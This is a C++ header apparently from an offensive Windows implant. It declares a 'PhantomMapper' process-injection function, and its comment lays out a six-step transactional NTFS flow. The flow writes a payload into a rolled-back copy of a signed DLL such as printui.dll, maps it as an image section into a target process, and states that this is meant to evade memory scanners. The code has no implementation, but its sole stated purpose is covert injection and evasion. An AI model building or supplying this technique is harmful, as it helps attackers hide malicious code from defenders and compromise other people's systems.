#pragma once

#include <windows.h>

// Phantom DLL Mapper (Phase 5)
//
// Uses Transactional NTFS (TxF) to map a payload into memory such that
// it appears to be a legitimate, Microsoft-signed DLL file on disk.
// The payload is mapped with SEC_IMAGE, making it almost impossible 
// for memory scanners to differentiate it from normal executable code.
//
// Flow:
// 1. NtCreateTransaction
// 2. CreateFileTransacted (on a legitimate DLL like printui.dll)
// 3. Write payload into the transacted file handle
// 4. NtCreateSection (SEC_IMAGE)
// 5. Rollback Transaction (changes never hit the physical disk)
// 6. MapViewOfSection into target process

namespace PhantomMapper {

// Inject via Transactional NTFS. Returns the mapped PVOID on success, or nullptr.
PVOID InjectTransacted(HANDLE hProcess, const void* pPayload, size_t payloadSize);

} // namespace PhantomMapper
